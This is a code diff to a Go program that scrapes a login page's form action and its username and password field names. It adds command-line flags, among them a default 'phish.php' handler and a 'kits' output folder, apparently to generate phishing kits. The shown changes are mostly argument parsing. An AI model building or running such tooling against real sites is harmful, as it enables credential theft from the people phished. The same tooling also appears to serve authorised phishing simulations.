@@ -1,6 +1,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"net/url"
 	"os"
@@ -8,6 +9,13 @@ import (
 	"path/filepath"
 
 	"github.com/gocolly/colly"
+)
+
+var (
+	destFolder  string
+	urlin       string
+	agent       string
+	phpFilename string
 )
 
 // getFormPost checks if there is a POST with an action and returns the path, login attribute name, and password attribute name.
@@ -33,11 +41,36 @@ func getFormPost(urlin string, agent string) (string, string, string) {
 	return postPath, postLogin, postPassword
 }
 
+func main() {
+
+	// parse flag and cli inputs
+	flag.StringVar(&urlin, "url", "", "URL of login page")
+	flag.StringVar(&agent, "ua", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.6778.73 Mobile/15E148 Safari/604.1", "User Agent string")
+	flag.StringVar(&phpFilename, "php", "phish.php", "Path to the PHP file to be used")
+	flag.StringVar(&destFolder, "kits", "kits", "Path used to store the kits")
+
+	flag.Parse()
+
+	// check if url was provided
+	if urlin == "" {
+		fmt.Fprintf(os.Stderr, "\nEmpty URL, please specify a URL using the -url flag.\n")
+		os.Exit(1)
+
+		// remove / from end of url
+	} else if string(urlin[len(urlin)-1]) == "/" {
+		urlin = urlin[0 : len(urlin)-1]
+	}
+
+	printBanner()
+
+	initiateCollector(urlin, agent, destFolder, phpFilename)
+}
+
 func initiateCollector(urlin string, agent string, destFolder string, phpFilename string) {
 	c := colly.NewCollector(colly.UserAgent(agent))
 
 	// Get parameters of the form in the HTML
-	fmt.Printf("Navigating to %s using the following user agent: %s\n\n", urlin, agent)
+	fmt.Printf("Process started!\nNavigating to %s\nuser agent: %s\n\n", urlin, agent)
 	postPath, postLogin, postPassword := getFormPost(urlin, agent)
 
 	if postPath == "" || postLogin == "" || postPassword == "" {
